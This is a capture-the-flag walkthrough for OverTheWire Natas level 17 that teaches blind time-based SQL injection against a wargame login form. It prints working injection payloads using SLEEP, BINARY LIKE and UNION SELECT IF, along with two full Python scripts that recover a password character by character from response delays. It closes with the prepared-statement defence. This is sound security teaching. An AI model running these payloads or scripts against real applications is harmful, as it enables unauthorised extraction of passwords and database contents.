# OverTheWire: Natas — Level 17 → Level 18

> **Vulnerability:** Blind Time-Based SQL Injection                                                       
> **Skills:** SQL injection, time-based side-channel inference, scripted brute-force                                                
> **Difficulty:** Hard                                                             
> **Official Page:** [Natas Level 17](https://overthewire.org/wargames/natas/natas17.html)

---

## Access

- **URL:** `http://natas17.natas.labs.overthewire.org`
- **Username:** `natas17`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas18` by exploiting a blind time-based SQL injection vulnerability in the username lookup form, using response delay as an oracle to reconstruct the password one character at a time.

---

## Vulnerability

This level demonstrates **blind time-based SQL injection**. The application passes user-supplied input directly into a MySQL query without sanitisation or parameterisation. Unlike a standard SQL injection where query results are returned to the page, this variant is "blind" — the page returns no output regardless of what the query produces. However, MySQL's `SLEEP()` function can be injected to introduce a measurable delay when a condition is true. The attacker uses response time as a side-channel: a slow response means the condition matched; an immediate response means it did not. This allows full extraction of database contents with no visible output at all. The developer mistake is constructing a SQL query by concatenating raw user input — the classic failure to use prepared statements.

---

## Theory

### The vulnerable query

The page accepts a username and checks whether it exists in the database. The PHP source exposes a query that looks like this:

```php
<?php
// Source exposed on the page
$query = "SELECT * FROM users WHERE username=\"$_REQUEST["username"]\"";
$res = mysqli_query($link, $query);
if($res) {
    if(mysqli_num_rows($res) > 0) {
        // User exists — but nothing is printed to the page
    } else {
        // User not found — but nothing is printed to the page
    }
}
?>
```

> **What to notice:** The result of the query is never printed. The page gives no feedback either way. This is what makes it "blind" — normal SQL injection techniques that rely on reading output from the page do not work here.

### Why timing works as an oracle

MySQL's `SLEEP(N)` function pauses query execution for `N` seconds. When embedded inside a conditional:

```sql
AND SLEEP(1)
```

or:

```sql
AND IF(condition, SLEEP(1), 0)
```

the delay only occurs if the surrounding condition evaluates to true. From the attacker's perspective:

- Response arrives in ~1+ seconds → condition was **true**
- Response arrives immediately → condition was **false**

This is a 1-bit oracle per request. Run it 32 times per character position and you can reconstruct any string.

### The `BINARY` keyword and case sensitivity

By default, MySQL string comparisons are case-insensitive. `LIKE "a%"` would match rows where the password starts with either `a` or `A`. Since passwords are case-sensitive, this would produce ambiguous results.

`BINARY` forces a byte-for-byte comparison:

```sql
BINARY password LIKE "a%"   -- only matches lowercase 'a'
BINARY password LIKE "A%"   -- only matches uppercase 'A'
```

Without `BINARY`, the character set is effectively halved (26 letters instead of 52), and even then you cannot determine the correct case.

### The `LIKE` operator with `%` for prefix matching

`LIKE "abc%"` matches any string that **starts with** `abc`. This is how the script tests prefixes progressively:

- Round 1: test `a%`, `b%`, `c%` ... until a match (delay) is found → first character confirmed
- Round 2: test `Xa%`, `Xb%`, `Xc%` ... (where `X` is the confirmed first character) → second character confirmed
- Repeat for all 32 characters

### Tools and concepts

| Tool / Concept | Purpose |
|---|---|
| `SLEEP(N)` | MySQL function: pauses execution for N seconds — used as the timing oracle |
| `BINARY` | MySQL keyword: forces case-sensitive byte comparison |
| `LIKE "prefix%"` | SQL pattern match: tests whether a value starts with a given prefix |
| `AND condition` | SQL: appends an additional condition to the WHERE clause |
| `#` (comment) | MySQL inline comment: discards everything after it — used to neutralise trailing SQL |
| `time.time()` | Python: returns current Unix timestamp in seconds — used to measure response duration |
| `requests.Session` | Python: reuses HTTP connections across requests for efficiency |
| `UNION SELECT` | SQL: appends a second result set to the original query — used in the alternative method |
| `IF(cond, a, b)` | MySQL: returns `a` if condition is true, `b` otherwise — used in the UNION alternative |

**Good to know — not needed for the primary method:**

| Concept | Notes |
|---|---|
| `CHAR_LENGTH(str)` | MySQL: returns string length in characters. Used in the alternative UNION method to filter rows by password length. |
| `LIMIT M, N` | MySQL: skips `M` rows and returns the next `N`. Used in the UNION method to select a specific row from multiple results. |
| `httplib` (Python 2) | Legacy HTTP library — replaced by `http.client` in Python 3 and by `requests` for practical use. The alternative script below is rewritten in Python 3. |

---

## Solution

### Method 1 — Automated blind time-based injection (recommended)

**Step 1 — Log in and observe the page**

Navigate to `http://natas17.natas.labs.overthewire.org` and authenticate with `natas17` and the password from the previous level. You are presented with a form asking for a username.

> **What to notice:** Enter any username — `natas18`, `admin`, `foo`. The page returns no output in any case. There is no "user found" or "user not found" message. This is the blind condition: you are working with zero visible feedback.

**Step 2 — View the page source**

Press `Ctrl+U` to view source. The PHP source is embedded on the page.

```php
<?php
$query = "SELECT * FROM users WHERE username=\"$_REQUEST["username"]\"";
$res = mysqli_query($link, $query);
if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
}
?>
```

> **What to notice:** Both output lines are commented out. The developer disabled the feedback intentionally — but the query still runs, and `SLEEP()` will still delay the response. Commenting out output does not prevent timing attacks.

**Step 3 — Confirm the injection works manually**

Before automating, verify that the timing oracle is real. Open the browser's Network tab (`F12` → Network), then submit this in the username field:

```
natas18" AND SLEEP(3) #
```

> **What to notice:** The request should take approximately 3 seconds to complete. Check the "Time" column in the Network tab. If it shows ~3000ms, the `SLEEP()` executed, which confirms the injection point is live. Now try:

```
natas18" AND SLEEP(0) #
```

> **What to notice:** This should return immediately (~0ms). You have a working boolean-timing oracle: slow = condition true, fast = condition false.

**Step 4 — Understand the payload structure**

The full injection payload for testing a password prefix is:

```sql
natas18" AND BINARY password LIKE "PREFIX%" AND SLEEP(1) #
```

When injected into the query template, this becomes:

```sql
SELECT * FROM users WHERE username="natas18" AND BINARY password LIKE "PREFIX%" AND SLEEP(1) #"
```

- `username="natas18"` — targets the correct user row
- `BINARY password LIKE "PREFIX%"` — case-sensitive prefix check
- `AND SLEEP(1)` — delays response by 1 second only if all prior conditions are true
- `#` — comments out the closing `"` left over from the original query

> **What to notice:** `SLEEP(1)` only executes if the `natas18` row exists **and** the password starts with `PREFIX`. If either condition fails, the query short-circuits and returns immediately. This gives you precise, per-character confirmation.

**Step 5 — Write and run the automation script**

Create a file called `natas17.py`:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Blind time-based SQL injection — Natas Level 17
# Original approach credited to John Hammond

import requests
import time
import string

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

username = 'natas17'
password = '<natas17_password>'          # replace with your actual password

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    for character in characters:
        test_password = ''.join(seen_password) + character
        payload = f'natas18" AND BINARY password LIKE "{test_password}%" AND SLEEP(1) #'

        start_time = time.time()
        session.post(
            url,
            data={"username": payload},
            auth=(username, password)
        )
        elapsed = time.time() - start_time

        if elapsed > 1:
            seen_password.append(character)
            print(f"[+] Found so far: {''.join(seen_password)}")
            break

print(f"[+] Final password: {''.join(seen_password)}")
```

Run it:

```bash
python3 natas17.py
```

```
[+] Found so far: x
[+] Found so far: xv
[+] Found so far: xvK
[+] Found so far: xvKI
[+] Found so far: xvKIq
...
[+] Final password: <32-character password>
```

> **What to notice:** Each confirmed character takes at least 1 second (the `SLEEP` duration). For a 32-character password with up to 62 candidates per position, worst case is 62 × 32 × 1 second ≈ 33 minutes. In practice, average case is roughly half that. You can reduce `SLEEP(1)` to `SLEEP(0.5)` and lower the threshold to `0.5` to speed things up, but be aware that network latency on a slow connection may cause false positives.

---

### Method 2 — UNION-based time injection (alternative)

This method uses a `UNION SELECT` to attach a custom SELECT statement to the original query, embedding the timing condition inside MySQL's `IF()` function. It is more flexible because it allows querying any table and any column directly, rather than relying on the specific row targeted by the WHERE clause.

**The payload structure:**

```sql
N0tAC0ntent" UNION SELECT 1, IF(
    (SELECT password FROM users WHERE CHAR_LENGTH(password)=32 LIMIT 3,1)
    LIKE BINARY "PREFIX%",
    SLEEP(2),
    1
) --
```

Breaking this down:

- `N0tAC0ntent"` — a username that does not exist, so the original WHERE clause returns no rows
- `UNION SELECT 1, IF(...)` — appends a synthetic row; the second column contains the timing condition
- `SELECT password FROM users WHERE CHAR_LENGTH(password)=32 LIMIT 3,1` — fetches the password from the 4th row (index 3) of users whose password is exactly 32 characters long
- `LIKE BINARY "PREFIX%"` — case-sensitive prefix test
- `SLEEP(2)` — fires if the prefix matches; `1` is returned immediately if not
- `--` — MySQL comment to discard the trailing `"`

> **What to notice:** `LIMIT 3,1` selects a specific row by index (0-based). The users table contains multiple accounts. Change the first number (0 through 3) to target different rows. The password for `natas18` is in one of these rows.

**Python 3 implementation of the UNION method:**

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UNION-based blind time injection — Natas Level 17
# Rewritten from Python 2 original

import requests
import time
import string

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits

username = 'natas17'
password = '<natas17_password>'          # replace with your actual password

url = 'http://natas17.natas.labs.overthewire.org/index.php'
auth = (username, password)

SLEEP_SECONDS = 0.5
THRESHOLD = 0.45    # slightly below sleep duration to account for variance
ROW_INDEX = 3       # change 0–3 to target different rows in the users table

seen_password = []

while len(seen_password) < 32:
    for character in characters:
        prefix = ''.join(seen_password) + character
        sql = (
            f'N0tAC0ntent" UNION SELECT 1, IF('
            f'(SELECT password FROM users WHERE CHAR_LENGTH(password)=32 '
            f'LIMIT {ROW_INDEX},1) LIKE BINARY "{prefix}%",'
            f'SLEEP({SLEEP_SECONDS}),1) -- '
        )
        start = time.time()
        requests.get(url, params={"username": sql}, auth=auth, timeout=30)
        elapsed = time.time() - start

        if elapsed >= THRESHOLD:
            seen_password.append(character)
            print(f"[+] Found so far: {''.join(seen_password)}")
            break

print(f"[+] Final password: {''.join(seen_password)}")
```

> **What to notice:** `THRESHOLD` must be set below `SLEEP_SECONDS` but above your typical baseline network latency. If your connection to the server has ~200ms baseline latency, a threshold of `0.45` for a `0.5`s sleep is appropriate. On a high-latency connection, increase `SLEEP_SECONDS` to `1.0` or `2.0` and raise the threshold accordingly to avoid false positives.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

- Blind SQL injection does not require any visible output from the server. As long as a conditional expression can influence a measurable property of the response — duration, status code, content length — the contents of any accessible database table can be extracted character by character. Disabling output does not eliminate the vulnerability; it only changes which side-channel the attacker uses.
- `SLEEP()`-based timing oracles are reliable in low-latency environments but degrade on high-latency or variable-latency connections. Real-world exploitation often requires tuning sleep duration and thresholds against measured baseline latency, or switching to content-length oracles when timing is too noisy.
- The correct defence is a prepared statement with bound parameters — not output suppression, not input filtering. A parameterised query makes injection structurally impossible because user input is never interpreted as SQL syntax, regardless of what characters it contains.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Setting the timing threshold too low relative to network latency | False positives fire on every character; the script builds a garbage password | Measure your baseline response time with `SLEEP(0)` first and set the threshold well above it |
| Using `SLEEP(0.1)` or very short delays | Network jitter causes the delay to be indistinguishable from normal response variance | Use at least `SLEEP(0.5)` and ideally `SLEEP(1)` on a remote server; only use short sleeps on localhost |
| Forgetting `BINARY` in the comparison | The script matches both `a` and `A` as correct for the same position, producing an ambiguous result or the wrong case | Always use `BINARY` when extracting case-sensitive strings such as passwords |
| Not including `#` or `--` to comment out trailing SQL | The injected query has a dangling `"` that causes a syntax error; every request fails silently | Always terminate injected SQL with a comment character appropriate for the database (`#` or `-- ` for MySQL) |
| Targeting the wrong row with `LIMIT` in the UNION method | The script extracts a different user's password, not `natas18`'s | Verify the correct row index by checking which extracted password actually authenticates to `natas18` |
| Not adding a timeout to requests | If the server is slow or the connection drops, the script hangs indefinitely | Always pass `timeout=30` (or similar) to `requests.get` / `requests.post` |
| Running the script over a VPN or high-latency connection without adjusting thresholds | Timing oracle becomes unreliable; characters are misidentified | Either increase `SLEEP_SECONDS` significantly or switch to a lower-latency connection before running |
